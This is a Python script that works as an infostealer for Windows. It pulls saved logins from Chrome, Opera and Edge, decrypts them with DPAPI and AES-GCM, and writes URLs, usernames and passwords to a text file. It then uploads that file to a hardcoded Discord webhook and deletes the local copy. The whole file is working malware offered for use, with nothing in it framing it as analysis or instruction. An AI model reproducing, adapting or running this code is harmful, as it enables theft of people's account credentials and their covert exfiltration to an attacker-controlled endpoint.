import os
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import ctypes
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1255615157221195877/OHNjGv4u3xNOUYvFF3W24s30Khg-RVVN9cEEbyVg9LYJOPsSmUQrp38cOofpFZQ8S8Xk'

def send_to_webhook(file_path):
    files = {'file': open(file_path, 'rb')}
    response = requests.post(WEBHOOK_URL, files=files)
    if response.status_code == 200:
        print("File sent successfully.")
    else:
        print(f"Failed to send file. Status code: {response.status_code}")

def fetch_key(browser_path):
    local_state_path = os.path.join(browser_path, 'Local State')
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encryption_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encryption_key = encryption_key[5:]  # dpapi :3
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def decrypt(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def fetch_passwords(browser_name, browser_path):
    all_passwords = []
    for root, dirs, files in os.walk(browser_path):
        for dir in dirs:
            db_path = os.path.join(root, dir, 'Login Data')
            if not os.path.exists(db_path):
                continue
            
            filename = f'{browser_name}Data_{dir}.db'
            shutil.copyfile(db_path, filename)
            
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            
            key = fetch_key(browser_path)
            
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                password = decrypt(encrypted_password, key)
                if username or password:
                    all_passwords.append(f'URL: {url}\nUsername: {username}\nPassword: {password}\n')
            
            cursor.close()
            db.close()
            os.remove(filename)
    
    return all_passwords

def main():
    all_passwords = []
    
    # Chrome 
    try:
        chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
        if os.path.exists(chrome_path):
            all_passwords.extend(fetch_passwords('Chrome', chrome_path))
    except Exception as e:
        print(f"C: {e}")
    
    # Opera 
    try:
        opera_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software')
        if os.path.exists(opera_path):
            all_passwords.extend(fetch_passwords('Opera', opera_path))
    except Exception as e:
        print(f"O: {e}")

    # Edge 
    try:
        edge_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
        if os.path.exists(edge_path):
            all_passwords.extend(fetch_passwords('Edge', edge_path))
    except Exception as e:
        print(f"E: {e}")
    
    temp_file_path = 'passwords.txt'
    with open(temp_file_path, 'w', encoding='utf-8') as file:
        file.write("\n".join(all_passwords))
    
    if os.path.exists(temp_file_path):
        send_to_webhook(temp_file_path)
        os.remove(temp_file_path)
    else:
        print("No passwords found or failed to write to file.")

if __name__ == '__main__':
    main()
